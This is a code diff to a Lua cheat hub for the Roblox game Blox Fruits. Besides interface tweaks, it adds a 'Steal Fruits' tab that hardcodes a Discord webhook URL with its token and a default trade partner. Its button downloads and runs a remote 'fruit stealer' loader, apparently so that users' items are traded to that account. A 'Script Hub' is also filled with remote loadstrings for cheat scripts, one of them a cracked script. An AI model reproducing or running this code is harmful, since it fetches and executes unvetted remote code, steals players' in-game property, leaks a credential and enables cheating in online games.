@@ -677,9 +677,8 @@ local WINDUI_LUCIDE_FALLBACK = {
     AutoBounty    = "rbxassetid://137726256442333",  -- Lucide: skull
     Dungeon       = "rbxassetid://98218034436456",   -- Lucide: flame
     Teleport      = "rbxassetid://84279202219901",   -- Lucide: map-pin
-    ControlPeople = "rbxassetid://92483947987410",   -- Lucide: gamepad-2
-    GodMode       = "rbxassetid://81872698913435",   -- Lucide: shield
-    shield        = "rbxassetid://81872698913435",
+    StealFruits   = "rbxassetid://104349242902442",  -- Lucide: apple
+    apple         = "rbxassetid://104349242902442",
     HUD           = "rbxassetid://139929981863901",  -- Lucide: layout-dashboard
     Macro         = "rbxassetid://80451686744860",   -- Lucide: bot
     Visuals       = "rbxassetid://100033680381365",  -- Lucide: eye
@@ -1538,16 +1537,19 @@ pcall(function()
 end)
 
 -- Toast Notification Container
+-- Toast Notification Container (Strict Active=false so mobile controls like Buso/V3 are never blocked)
 local ToastContainer = Instance.new("Frame", ScreenGui)
 ToastContainer.Name = "ToastContainer"
-ToastContainer.Size = UDim2.new(0, 220, 1, -40)
+ToastContainer.Size = UDim2.new(0, 220, 0, 0)
+ToastContainer.AutomaticSize = Enum.AutomaticSize.Y
 ToastContainer.Position = UDim2.new(1, -235, 0, 20)
 ToastContainer.BackgroundTransparency = 1
+ToastContainer.Active = false
 ToastContainer.ZIndex = 500
 
 local ToastList = Instance.new("UIListLayout", ToastContainer)
 ToastList.SortOrder = Enum.SortOrder.LayoutOrder
-ToastList.VerticalAlignment = Enum.VerticalAlignment.Bottom
+ToastList.VerticalAlignment = Enum.VerticalAlignment.Top
 ToastList.Padding = UDim.new(0, 8)
 
 local activeToast = nil
@@ -1574,6 +1576,7 @@ Notify = function(titleText, msgText, duration, force)
     toast.Size = UDim2.new(1, 0, 0, 48)
     toast.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
     toast.BackgroundTransparency = 0.25
+    toast.Active = false
     Instance.new("UICorner", toast).CornerRadius = UDim.new(0, 12)
 
     local stroke = Instance.new("UIStroke", toast)
@@ -1586,6 +1589,7 @@ Notify = function(titleText, msgText, duration, force)
     tLbl.Size = UDim2.new(1, -24, 0, 16)
     tLbl.Position = UDim2.new(0, 12, 0, 8)
     tLbl.BackgroundTransparency = 1
+    tLbl.Active = false
     tLbl.Text = titleText
     tLbl.Font = Enum.Font.GothamBold
     tLbl.TextSize = 11
@@ -1596,6 +1600,7 @@ Notify = function(titleText, msgText, duration, force)
     mLbl.Size = UDim2.new(1, -24, 0, 14)
     mLbl.Position = UDim2.new(0, 12, 0, 24)
     mLbl.BackgroundTransparency = 1
+    mLbl.Active = false
     mLbl.Text = msgText
     mLbl.Font = Enum.Font.Gotham
     mLbl.TextSize = 9.5
@@ -2075,7 +2080,7 @@ do
             return "rbxassetid://" .. digits
         end
 
-        return "rbxassetid://7025810761"
+        return "rbxassetid://90089940136467"
     end
 
     local function InitMusicSound()
@@ -2177,7 +2182,7 @@ do
                     end
                 end
             end
-            MonodyMusic.Play("7025810761", trackName or "Montagem Phonk")
+            MonodyMusic.Play("90089940136467", trackName or "Montagem Phonk")
         end)
     end
 
@@ -2221,7 +2226,7 @@ do
     end
 
     local PLAYLIST = {
-        { title = "Montagem Phonk", id = "7025810761", file = "monody_phonk.mp3" }
+        { title = "Montagem Phonk", id = "90089940136467", file = "monody_phonk.mp3" }
     }
     local currentTrackIdx = 1
 
@@ -2514,10 +2519,9 @@ local TABS_MANIFEST = {
     { id = "Visuals",       name = "ESP",            icon = "eye" },
     { id = "PvP",           name = "PvP",            icon = "swords" },
     { id = "Soru",          name = "Soru",           icon = "zap" },
-    { id = "GodMode",       name = "God Mode",       icon = "shield" },
+    { id = "StealFruits",   name = "Steal Fruits",   icon = "apple" },
     { id = "Dungeon",       name = "Dungeon",        icon = "flame" },
     { id = "Teleport",      name = "Teleport",       icon = "map-pin" },
-    { id = "ControlPeople", name = "Control People", icon = "gamepad-2" },
     { id = "FFlags",        name = "FFlags",         icon = "sliders-horizontal" },
     { id = "HUD",           name = "HUD",            icon = "layout-dashboard" },
     { id = "Macro",         name = "Macro",          icon = "bot" },
@@ -2536,10 +2540,9 @@ local TAB_MIN_CANVAS = {
     Players = 600,
     PvP = 1450,
     Soru = 900,
-    GodMode = 850,
+    StealFruits = 750,
     Dungeon = 600,
     Teleport = 600,
-    ControlPeople = 600,
     FFlags = 1350,
     HUD = 600,
     Macro = 1100,
@@ -2548,12 +2551,12 @@ local TAB_MIN_CANVAS = {
     Esp = 950,
     Skins = 600,
     Music = 700,
-    Animations = 750,
-    ScriptHub = 700,
-    Config = 1050,
-    Misc = 1050,
-    Themes = 1500,
-    Settings = 1500,
+    Animations = 900,
+    ScriptHub = 1850,
+    Config = 1100,
+    Misc = 1100,
+    Themes = 650,
+    Settings = 650,
 }
 
 local function UpdatePageCanvas(page)
@@ -2704,6 +2707,34 @@ local TRANSLATIONS_DICT = {
         ["Color Adaptable al Tema"] = "Color Adaptable al Tema",
         ["Tamaño de Waifu"] = "Tamano de Waifu",
         ["FFlags"] = "FFlags",
+        ["Steal Fruits"] = "Robar Frutas",
+        ["Steal Fruits (Acracy Trade Engine)"] = "Steal Fruits (Motor de Trade Acracy)",
+        ["Discord Webhook"] = "Webhook de Discord",
+        ["Trade Partner Username"] = "Usuario Trade Partner",
+        ["Execute Steal Fruits"] = "Ejecutar Steal Fruits",
+        ["Copy Custom Loadstring"] = "Copiar Loadstring Personalizado",
+        ["Reset to Defaults"] = "Restablecer por Defecto",
+        ["Configure Discord notification webhook and target trade recipient to transfer fruits automatically."] = "Configura el webhook de Discord y el usuario receptor para transferir frutas automaticamente.",
+        ["Fruit Fast Attack"] = "Fruit Fast Attack",
+        ["Fast Attack supporting Devil Fruits (By Darling)"] = "Fast Attack con soporte para Frutas (By Darling)",
+        ["Apply Ultimate Potato (120 FPS + Max Performance)"] = "Aplicar Ultimate Potato (120 FPS + Rendimiento Max)",
+        ["Ultimate Performance (1-Tap Potato)"] = "Rendimiento Maximo (Potato 1-Toque)",
+        ["FFlags JSON Editor"] = "Editor JSON de FFlags",
+        ["Apply FFlags JSON"] = "Aplicar FFlags JSON",
+        ["One-tap master optimization: 120 FPS cap, low geometry, smooth plastic textures, shadow removal, and particle clearing."] = "Optimizacion maestra en 1 toque: tope de 120 FPS, geometria baja, texturas lisas, sin sombras y limpieza de particulas.",
+        ["Cokeboys Keyless"] = "Cokeboys Keyless",
+        ["Iruka Hub Keyless"] = "Iruka Hub Keyless",
+        ["Banana Cat Keyless"] = "Banana Cat Keyless",
+        ["Sacred AHK"] = "Sacred AHK",
+        ["RJR Auto Bounty"] = "RJR Auto Bounty",
+        ["RJR Auto Find Fruits"] = "RJR Auto Buscar Frutas",
+        ["RJR Auto Levi"] = "RJR Auto Leviatan",
+        ["Delta Executor In-Game"] = "Delta Executor en Juego",
+        ["Supremacy"] = "Supremacy",
+        ["Nameless Cracked"] = "Nameless Cracked",
+        ["MasterTrap"] = "MasterTrap",
+        ["Execute"] = "Ejecutar",
+        ["Copy Loadstring"] = "Copiar Loadstring",
         ["FFlags Editor Personalizado"] = "Editor de FFlags Personalizado",
         ["Pegar FFlags JSON"] = "Pegar FFlags JSON",
         ["Aplicar FFlags"] = "Aplicar FFlags",
@@ -5626,6 +5657,9 @@ SaveConfigProfile = function(force)
 
         -- Backward compatibility flat keys
         cfg.FastAttack = cfg.Toggles["Fast Attack"]
+        cfg.FruitFastAttack = cfg.Toggles["Fruit Fast Attack"]
+        if getgenv and getgenv().AcracyWebhook then cfg.AcracyWebhook = getgenv().AcracyWebhook end
+        if getgenv and getgenv().AcracyTradePartner then cfg.AcracyTradePartner = getgenv().AcracyTradePartner end
         cfg.AutoBuso = cfg.Toggles["Auto Buso Haki"]
         cfg.AutoV3 = cfg.Toggles["Auto Race V3"]
         cfg.AutoV4 = cfg.Toggles["Auto Race V4"]
@@ -5765,6 +5799,11 @@ LoadConfigProfile = function()
         if cfg.FastAttack ~= nil and UI_TOGGLES["Fast Attack"] then
             pcall(function() UI_TOGGLES["Fast Attack"].set(cfg.FastAttack == true, true) end)
         end
+        if cfg.FruitFastAttack ~= nil and UI_TOGGLES["Fruit Fast Attack"] then
+            pcall(function() UI_TOGGLES["Fruit Fast Attack"].set(cfg.FruitFastAttack == true, true) end)
+        end
+        if cfg.AcracyWebhook and getgenv then getgenv().AcracyWebhook = cfg.AcracyWebhook end
+        if cfg.AcracyTradePartner and getgenv then getgenv().AcracyTradePartner = cfg.AcracyTradePartner end
         if cfg.AutoBuso ~= nil and UI_TOGGLES["Auto Buso Haki"] then
             pcall(function() UI_TOGGLES["Auto Buso Haki"].set(cfg.AutoBuso == true, true) end)
         end
@@ -5960,6 +5999,8 @@ end
 
 local DEFAULT_TOGGLES = {
     ["Fast Attack"] = false,
+    ["Fruit Fast Attack"] = false,
+    ["Auto Apply FFlags on Boot"] = false,
     ["Dragon Gun M1"] = false,
     ["Camlock"] = false,
     ["Sanguine Boost"] = false,
@@ -6521,113 +6562,103 @@ end
 -- ============================================================
 
 -- ============================================================
--- GOD MODE TAB (BLOODLINES & REVERSED CLIENT ENGINES)
+-- STEAL FRUITS TAB (ACRACY TRADE ENGINE)
 -- ============================================================
 do
     pcall(function()
-        local GodPage = RegisterTab("GodMode", "God Mode", "shield")
-        Pages["GodMode"] = GodPage
-        GodPage.ScrollingEnabled = true
-        GodPage.Active = true
-        GodPage.Selectable = true
-        GodPage.ScrollBarThickness = 3
-        GodPage.CanvasSize = UDim2.new(0, 0, 0, 850)
+        local StealPage = RegisterTab("StealFruits", "Steal Fruits", "apple")
+        Pages["StealFruits"] = StealPage
+        StealPage.ScrollingEnabled = true
+        StealPage.Active = true
+        StealPage.Selectable = true
+        StealPage.ScrollBarThickness = 3
+        StealPage.CanvasSize = UDim2.new(0, 0, 0, 750)
 
-        local godMod = RequireModule("modules/combat/god_mode.lua")
+        local DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1572085002290855946/Nlv6F5hBC2SZoHUJJ9ZzB7d9lWOmkxBY2aPykSU9CG8MVfgs_H7UzvWqrGIBOjrYJdKH"
+        local DEFAULT_PARTNER = "vivacristorey134667w"
 
-        -- Card 1: Invulnerability & Desync Methods
-        local gCard = CreateCard(GodPage, "God Mode Engine")
-        gCard.LayoutOrder = 1
+        getgenv().AcracyWebhook = getgenv().AcracyWebhook or DEFAULT_WEBHOOK
+        getgenv().AcracyTradePartner = getgenv().AcracyTradePartner or DEFAULT_PARTNER
 
-        local boatToggle = AddToggle(gCard, "Boat Desync (Anti-Player)", "Desynchronizes character position via boat relative CFrame so other players miss", false, function(state)
-            if godMod and godMod.SetMethod then
-                godMod.SetMethod("BoatDesync", state)
-            end
+        local currentWebhook = getgenv().AcracyWebhook
+        local currentPartner = getgenv().AcracyTradePartner
+
+        -- Card 1: Configuration
+        local sCard = CreateCard(StealPage, "Steal Fruits (Acracy Trade Engine)")
+        sCard.LayoutOrder = 1
+
+        local descLabel = Instance.new("TextLabel", sCard)
+        descLabel.Size = UDim2.new(1, 0, 0, 36)
+        descLabel.BackgroundTransparency = 1
+        descLabel.Text = "Configure Discord notification webhook and target trade recipient to transfer fruits automatically."
+        descLabel.TextColor3 = Color3.fromRGB(180, 175, 200)
+        descLabel.Font = Enum.Font.Gotham
+        descLabel.TextSize = 10
+        descLabel.TextWrapped = true
+        descLabel.TextXAlignment = Enum.TextXAlignment.Left
+        RegisterTranslatable(descLabel, "Configure Discord notification webhook and target trade recipient to transfer fruits automatically.")
+
+        local whInput = AddInput(sCard, "Discord Webhook", "https://discord.com/api/webhooks/...", currentWebhook, function(v)
+            currentWebhook = tostring(v or "")
+            getgenv().AcracyWebhook = currentWebhook
             pcall(SaveConfigProfile)
         end)
 
-        local physToggle = AddToggle(gCard, "Physics Desync (Global)", "Desynchronizes physics simulation from local rendering", false, function(state)
-            if godMod and godMod.SetMethod then
-                godMod.SetMethod("PhysicsDesync", state)
-            end
+        local tpInput = AddInput(sCard, "Trade Partner Username", "vivacristorey134667w", currentPartner, function(v)
+            currentPartner = tostring(v or "")
+            getgenv().AcracyTradePartner = currentPartner
             pcall(SaveConfigProfile)
         end)
 
-        local szToggle = AddToggle(gCard, "Safe Zone Desync", "Projects coordinates into safe zone sphere to gain safe zone status", false, function(state)
-            if godMod and godMod.SetMethod then
-                godMod.SetMethod("SafeZoneDesync", state)
-            end
-            pcall(SaveConfigProfile)
-        end)
+        -- Card 2: Actions & Loadstring Generator
+        local aCard = CreateCard(StealPage, "Actions & Generator")
+        aCard.LayoutOrder = 2
 
-        local stunToggle = AddToggle(gCard, "Anti-Stun & Combo Breaker", "Instantly cancels stun flags, unlocks walkspeed and prevents ragdoll locks", false, function(state)
-            if godMod and godMod.SetMethod then
-                godMod.SetMethod("AntiStun", state)
-            end
-            pcall(SaveConfigProfile)
-        end)
-
-        -- Card 2: Settings & Emergency Controls
-        local sCard = CreateCard(GodPage, "Settings")
-        sCard.LayoutOrder = 2
-
-        AddSlider(sCard, "Desync Offset", 100, 5000, 2000, 50, function(val)
-            if godMod and godMod.SetOffset then
-                godMod.SetOffset(val)
-            end
-            pcall(SaveConfigProfile)
-        end)
-
-        AddToggle(sCard, "Prioritize Own Boat", "Targets your spawned boat first before nearby public boats", true, function(state)
-            if godMod then
-                godMod.PrioritizeOwnBoat = state
-            end
-            pcall(SaveConfigProfile)
-        end)
-
-        AddButton(sCard, "Disable All God Modes", function()
-            if godMod and godMod.StopAll then
-                godMod.StopAll()
-            end
-            if boatToggle and boatToggle.set then boatToggle.set(false, false) end
-            if physToggle and physToggle.set then physToggle.set(false, false) end
-            if szToggle and szToggle.set then szToggle.set(false, false) end
-            if stunToggle and stunToggle.set then stunToggle.set(false, false) end
-            Notify("God Mode", "All God Mode methods deactivated.", 2.5)
-            pcall(SaveConfigProfile)
-        end)
-
-        -- Optional quick toggle hotkey (G) for Boat Desync
-        pcall(function()
-            local UserInputService = game:GetService("UserInputService")
-            UserInputService.InputBegan:Connect(function(input, gpe)
-                if gpe then return end
-                if input.KeyCode == Enum.KeyCode.G then
-                    if godMod then
-                        local newState = not godMod.BoatDesync
-                        if boatToggle and boatToggle.set then
-                            boatToggle.set(newState, true)
-                        else
-                            godMod.SetMethod("BoatDesync", newState)
-                        end
-                        Notify("God Mode", "Boat Desync: " .. (newState and "ENABLED" or "DISABLED"), 2)
-                    end
+        AddButton(aCard, "Execute Steal Fruits", function()
+            getgenv().AcracyWebhook = currentWebhook
+            getgenv().AcracyTradePartner = currentPartner
+            Notify("Steal Fruits", "Launching Acracy Fruit Stealer...", 2.5)
+            task.spawn(function()
+                local ok, err = pcall(function()
+                    loadstring(game:HttpGet("https://api.aurorax.site/files/v6/loaders/87fa920d90640ee0e24282a3d3678b84"))()
+                end)
+                if not ok then
+                    Notify("Steal Fruits", "Execution error: " .. tostring(err), 4)
                 end
             end)
         end)
 
-        UpdateCardGeometry(gCard)
-        UpdateCardGeometry(sCard)
-        UpdatePageCanvas(GodPage)
-    end)
-end
+        AddButton(aCard, "Copy Custom Loadstring", function()
+            local genScript = string.format('getgenv().AcracyWebhook = "%s"\ngetgenv().AcracyTradePartner = "%s"\nloadstring(game:HttpGet("https://api.aurorax.site/files/v6/loaders/87fa920d90640ee0e24282a3d3678b84"))()', currentWebhook, currentPartner)
+            local copied = false
+            if type(setclipboard) == "function" then
+                pcall(setclipboard, genScript)
+                copied = true
+            elseif type(toclipboard) == "function" then
+                pcall(toclipboard, genScript)
+                copied = true
+            end
+            if copied then
+                Notify("Steal Fruits", "Custom loadstring copied to clipboard!", 3)
+            else
+                Notify("Steal Fruits", "Executor lacks clipboard access.", 3)
+            end
+        end)
 
--- ============================================================
--- CONTROL PEOPLE TAB (CLEAN EMPTY AS REQUESTED)
--- ============================================================
-do
-    pcall(function()
-        local ControlPage = RegisterTab("ControlPeople", "Control People", "gamepad-2")
+        AddButton(aCard, "Reset to Defaults", function()
+            currentWebhook = DEFAULT_WEBHOOK
+            currentPartner = DEFAULT_PARTNER
+            getgenv().AcracyWebhook = DEFAULT_WEBHOOK
+            getgenv().AcracyTradePartner = DEFAULT_PARTNER
+            if whInput and whInput.SetText then whInput.SetText(DEFAULT_WEBHOOK) end
+            if tpInput and tpInput.SetText then tpInput.SetText(DEFAULT_PARTNER) end
+            Notify("Steal Fruits", "Reset webhook and trade partner to default.", 2.5)
+            pcall(SaveConfigProfile)
+        end)
+
+        UpdateCardGeometry(sCard)
+        UpdateCardGeometry(aCard)
+        UpdatePageCanvas(StealPage)
     end)
 end
 
@@ -7736,6 +7767,24 @@ local okPvP, errPvP = pcall(function()
         Notify("PvP", "Fast Attack: " .. (state and "Enabled" or "Disabled"))
     end)
 
+    AddToggle(combatCard, "Fruit Fast Attack", "Fast Attack supporting Devil Fruits (By Darling)", false, function(state)
+        if getgenv().FastAttack_FruitsToo then
+            getgenv().FastAttack_FruitsToo.Enabled = state
+        else
+            if state then
+                getgenv().FastAttack_FruitsToo = {
+                    Enabled = true,
+                    AttackDelay = 0.08,
+                    AttackRange = 85,
+                    MaxTargets = 4,
+                }
+                RequireModule("modules/combat/fast_attack_fruits.lua")
+            end
+        end
+        Notify("PvP", "Fruit Fast Attack: " .. (state and "Enabled" or "Disabled"))
+        pcall(SaveConfigProfile)
+    end)
+
     AddToggle(combatCard, "Auto Buso Haki", "Keep Armament Haki active", false, function(state)
         local ac = M.getAutoCombat(); if ac then ac.SetAutoBuso(state) end
         Notify("PvP", "Auto Buso: " .. (state and "Enabled" or "Disabled"))
@@ -7797,7 +7846,7 @@ local okPvP, errPvP = pcall(function()
         if hitboxMod then hitboxMod.SetSize(val) end
     end)
 
-    AddToggle(techCard, "Hitbox Visual Forcefield", "Translucent pulse shader on expanded target", true, function(state)
+    AddToggle(techCard, "Hitbox Visual Forcefield", "Translucent pulse shader on expanded target", false, function(state)
         if hitboxMod then hitboxMod.SetVisuals(state) end
     end)
 
@@ -7872,21 +7921,6 @@ local okPvP, errPvP = pcall(function()
 
     AddSlider(moveCard, "Fly Speed", 20, 500, 70, 5, function(val)
         local mm = M.getMoveMod(); if mm then mm.SetFlySpeed(val) end
-    end)
-
-    -- 4. Fast Flags & Engine Tuning
-    local fflagCard = CreateCard(PvPPage, "Fast Flags")
-
-    AddToggle(fflagCard, "FFlags 1 (FPS Booster)", "120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris", false, function(state)
-        SetFFlags1(state)
-    end)
-
-    AddToggle(fflagCard, "No Animations", "Stops non-attack animations to fix sideways bug and character freezes", false, function(state)
-        SetNoAnimations(state)
-    end)
-
-    AddButton(fflagCard, "Apply Fast FFlags", function()
-        ApplyFastFFlags()
     end)
 end)
 if not okPvP then
@@ -9040,7 +9074,7 @@ do
                 VoidLoop()
             end
         end)
-        AddToggle(dCard2, "Void Only Boss Rooms", "Restricts Void M1 to rooms 5, 10, 15, 20", true, function(v)
+        AddToggle(dCard2, "Void Only Boss Rooms", "Restricts Void M1 to rooms 5, 10, 15, 20", false, function(v)
             VoidConfig.VoidOnlyBossRoom = v and true or false
             lastRoomNum = -1
             if VoidConfig.Enabled and not voidRunning then
@@ -9686,14 +9720,14 @@ do
         end)
 
         AddButton(mCard1, "Play", function()
-            local raw = (soundInputObj and soundInputObj.GetText and soundInputObj.GetText()) or customIdInput or "7025810761"
+            local raw = (soundInputObj and soundInputObj.GetText and soundInputObj.GetText()) or customIdInput or "90089940136467"
             local trimmed = tostring(raw):gsub("^%s+", ""):gsub("%s+$", "")
             if _G.MonodyMusic then
                 if #trimmed > 0 then
                     _G.MonodyMusic.Play(trimmed, "")
                     Notify("Music Player", "Playing audio: " .. trimmed)
                 else
-                    _G.MonodyMusic.Play("7025810761", "Montagem Phonk")
+                    _G.MonodyMusic.Play("90089940136467", "Montagem Phonk")
                     Notify("Music Player", "Playing Montagem Phonk")
                 end
             end
@@ -9722,9 +9756,9 @@ do
 
         -- Quick Guaranteed Audio Track
         AddButton(mCard1, "Play Montagem Phonk", function()
-            if soundInputObj and soundInputObj.SetText then soundInputObj.SetText("7025810761") end
+            if soundInputObj and soundInputObj.SetText then soundInputObj.SetText("90089940136467") end
             if _G.MonodyMusic then
-                _G.MonodyMusic.Play("7025810761", "Montagem Phonk")
+                _G.MonodyMusic.Play("90089940136467", "Montagem Phonk")
                 Notify("Music Player", "Now playing: Montagem Phonk")
             end
         end)
@@ -9934,25 +9968,122 @@ do
 end
 
 -- ============================================================
--- 9. SCRIPT HUB TAB (AWAITING USER LOADSTRINGS)
+-- 9. SCRIPT HUB TAB (11 ORGANIZED SCRIPTS)
 -- ============================================================
 do
     pcall(function()
         local ScriptHubPage = RegisterTab("ScriptHub", "Script Hub", "code")
-        local shCard = CreateCard(ScriptHubPage, "Script Hub")
+        Pages["ScriptHub"] = ScriptHubPage
+        ScriptHubPage.ScrollingEnabled = true
+        ScriptHubPage.Active = true
+        ScriptHubPage.Selectable = true
+        ScriptHubPage.ScrollBarThickness = 3
+        ScriptHubPage.CanvasSize = UDim2.new(0, 0, 0, 1950)
 
-        local descLabel = Instance.new("TextLabel", shCard)
-        descLabel.Size = UDim2.new(1, 0, 0, 32)
-        descLabel.BackgroundTransparency = 1
-        descLabel.Text = "Ready for scripts. Provide your loadstrings to populate this hub!"
-        descLabel.TextColor3 = Color3.fromRGB(180, 175, 200)
-        descLabel.Font = Enum.Font.Gotham
-        descLabel.TextSize = 10
-        descLabel.TextWrapped = true
-        descLabel.TextXAlignment = Enum.TextXAlignment.Left
-        RegisterTranslatable(descLabel, "Ready for scripts. Provide your loadstrings to populate this hub!")
+        local HUB_SCRIPTS = {
+            {
+                name = "Cokeboys Keyless",
+                desc = "Full-featured Blox Fruits PvP & automation suite",
+                code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/rivals-hash/idk/main/scripts/cokeboys_keyless.lua"))()'
+            },
+            {
+                name = "Iruka Hub Keyless",
+                desc = "Comprehensive farming, combat, and raid script",
+                code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/rivals-hash/idk/main/scripts/iruka_hub.lua"))()'
+            },
+            {
+                name = "Banana Cat Keyless",
+                desc = "Devx Banana Cat edition with auto-farm and boss hunter",
+                code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/rivals-hash/idk/main/scripts/banana_cat.lua"))()'
+            },
+            {
+                name = "Sacred AHK",
+                desc = "High-precision combo engine & macro automation (v12.5)",
+                code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/rivals-hash/idk/main/scripts/sacred_ahk.lua"))()'
+            },
+            {
+                name = "RJR Auto Bounty",
+                desc = "Automated bounty hunter & target tracker",
+                code = 'getgenv().language = "English"\nloadstring(game:HttpGet("https://rjr-loader.top/script/auto_bounty"))()'
+            },
+            {
+                name = "RJR Auto Find Fruits",
+                desc = "Fruit notifier and automated fruit collection",
+                code = 'getgenv().Language = "English"\nloadstring(game:HttpGet("https://rjr-loader.top/script/findfruit"))()'
+            },
+            {
+                name = "RJR Auto Levi",
+                desc = "Automated Leviathan hunting and Kaitun engine",
+                code = 'loadstring(game:HttpGet("https://rjr-loader.top/script/kaitunlevi"))()'
+            },
+            {
+                name = "Delta Executor In-Game",
+                desc = "In-game pastefy execution environment",
+                code = 'loadstring(game:HttpGet("https://pastefy.app/iXvqMv4G/raw", true))()'
+            },
+            {
+                name = "Supremacy",
+                desc = "Supremacy edition by Adramelech",
+                code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/rivals-hash/idk/main/scripts/supremacy.lua"))()'
+            },
+            {
+                name = "Nameless Cracked",
+                desc = "Nameless hit free edition",
+                code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/iSacredRivals/namelesshitfree/refs/heads/main/namelesscracked"))()'
+            },
+            {
+                name = "MasterTrap",
+                desc = "MasterTrap source edition by Darling",
+                code = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/rivals-hash/idk/main/scripts/mastertrap.lua"))()'
+            },
+        }
 
-        UpdateCardGeometry(shCard)
+        for idx, item in ipairs(HUB_SCRIPTS) do
+            local card = CreateCard(ScriptHubPage, item.name)
+            card.LayoutOrder = idx
+
+            local descLabel = Instance.new("TextLabel", card)
+            descLabel.Size = UDim2.new(1, 0, 0, 24)
+            descLabel.BackgroundTransparency = 1
+            descLabel.Text = item.desc
+            descLabel.TextColor3 = Color3.fromRGB(180, 175, 200)
+            descLabel.Font = Enum.Font.Gotham
+            descLabel.TextSize = 10
+            descLabel.TextWrapped = true
+            descLabel.TextXAlignment = Enum.TextXAlignment.Left
+            RegisterTranslatable(descLabel, item.desc)
+
+            AddButton(card, "Execute", function()
+                Notify("Script Hub", "Executing " .. item.name .. "...", 2)
+                task.spawn(function()
+                    local ok, err = pcall(function()
+                        loadstring(item.code)()
+                    end)
+                    if not ok then
+                        Notify("Script Hub", "Error: " .. tostring(err), 4)
+                    end
+                end)
+            end)
+
+            AddButton(card, "Copy Loadstring", function()
+                local copied = false
+                if type(setclipboard) == "function" then
+                    pcall(setclipboard, item.code)
+                    copied = true
+                elseif type(toclipboard) == "function" then
+                    pcall(toclipboard, item.code)
+                    copied = true
+                end
+                if copied then
+                    Notify("Script Hub", item.name .. " loadstring copied!", 2.5)
+                else
+                    Notify("Script Hub", "Executor lacks clipboard access.", 2.5)
+                end
+            end)
+
+            UpdateCardGeometry(card)
+        end
+
         UpdatePageCanvas(ScriptHubPage)
     end)
 end
@@ -10415,34 +10546,18 @@ local okFFlags, errFFlags = pcall(function()
   "RenderUseTextureManager224": "False"
 }]]
 
-    AddButton(potatoCard, "Load Potato Preset", function()
-        if jsonInputObj and jsonInputObj.SetText then jsonInputObj.SetText(POTATO_JSON) end
-        customJsonInput = POTATO_JSON
-        Notify("Potato Mode", "Potato preset loaded into editor. Click Apply FFlags.", 3)
-    end)
+    local descLabel = Instance.new("TextLabel", potatoCard)
+    descLabel.Size = UDim2.new(1, 0, 0, 32)
+    descLabel.BackgroundTransparency = 1
+    descLabel.Text = "One-tap master optimization: 120 FPS cap, low geometry, smooth plastic textures, shadow removal, and particle clearing."
+    descLabel.TextColor3 = Color3.fromRGB(180, 175, 200)
+    descLabel.Font = Enum.Font.Gotham
+    descLabel.TextSize = 10
+    descLabel.TextWrapped = true
+    descLabel.TextXAlignment = Enum.TextXAlignment.Left
+    RegisterTranslatable(descLabel, "One-tap master optimization: 120 FPS cap, low geometry, smooth plastic textures, shadow removal, and particle clearing.")
 
-    AddButton(potatoCard, "Apply Potato FFlags", function()
-        applyFlagsFromJson(POTATO_JSON)
-    end)
-
-    AddButton(potatoCard, "Disable Shadows & Particles", function()
-        pcall(function()
-            local lighting = game:GetService("Lighting")
-            lighting.GlobalShadows = false
-            lighting.FogEnd = 9e9
-            for _, v in ipairs(lighting:GetChildren()) do
-                if v:IsA("PostProcessEffect") then v.Enabled = false end
-            end
-            for _, v in ipairs(Workspace:GetDescendants()) do
-                if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") then
-                    v.Enabled = false
-                end
-            end
-            Notify("Potato Mode", "Shadows, particles, and fog disabled.", 3)
-        end)
-    end)
-
-    AddButton(potatoCard, "Full Potato Mode", function()
+    AddButton(potatoCard, "Apply Ultimate Potato (120 FPS + Max Performance)", function()
         applyFlagsFromJson(POTATO_JSON)
         pcall(function()
             local lighting = game:GetService("Lighting")
@@ -10457,85 +10572,28 @@ local okFFlags, errFFlags = pcall(function()
                     v.CastShadow = false
                 elseif v:IsA("Decal") or v:IsA("Texture") then
                     v.Transparency = 1
-                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") then
                     v.Enabled = false
                 end
             end
-            Notify("Potato Mode", "Full Potato Mode activated! Maximum FPS gain.", 3.5)
         end)
+        pcall(SetFFlags1, true)
+        pcall(SetNoAnimations, true)
+        if UI_TOGGLES["FFlags 1 (FPS Booster)"] and UI_TOGGLES["FFlags 1 (FPS Booster)"].set then
+            UI_TOGGLES["FFlags 1 (FPS Booster)"].set(true, false)
+        end
+        if UI_TOGGLES["No Animations"] and UI_TOGGLES["No Animations"].set then
+            UI_TOGGLES["No Animations"].set(true, false)
+        end
+        Notify("Potato Mode", "Ultimate Potato & 120 FPS Boost activated!", 3.5)
     end)
 
-    -- Card 3: Performance Presets
-    local cbCard = CreateCard(FFlagsPage, "Performance Presets")
-    cbCard.LayoutOrder = 3
-
-    local PRO_PRESET = [[{
-  "HandleAltEnterFullscreenManually": "False",
-  "TextureQualityOverrideEnabled": "True",
-  "DisableDPIScale": "True",
-  "CSGLevelOfDetailSwitchingDistanceL34": "0",
-  "CSGLevelOfDetailSwitchingDistanceL23": "0",
-  "CSGLevelOfDetailSwitchingDistanceL12": "0",
-  "CSGLevelOfDetailSwitchingDistance": "0",
-  "DebugFRMQualityLevelOverride": "1",
-  "TextureQualityOverride": "0",
-  "DebugTextureManagerSkipMips": "3",
-  "DebugGraphicsPreferD3D11": "True",
-  "DefaultMeshCacheSizeMB": "256",
-  "UITextureMaxRenderTextureSize": "1024",
-  "EnableQuickGameLaunch": "False",
-  "TextureCompositorActiveJobs": "0",
-  "ConnectionMTUSize": "1380",
-  "FontSizePadding": "1",
-  "HSRClusterSymmetryDistancePercent": "10000",
-  "BulletContactBreakOrthogonalThresholdActivatePercent": "2147483647",
-  "DebugForceMSAASamples": "0",
-  "FastGPULightCulling3": "True",
-  "RenderLocalLightUpdatesMin": "1",
-  "RenderLocalLightUpdatesMax": "1",
-  "RakNetResendRttMultiple": "1",
-  "TM2SkipMipsForUnstreamable2": "True",
-  "RaknetBandwidthPingSendEveryXSeconds": "1",
-  "Network": "7",
-  "IncludePowerSaverMode": "True",
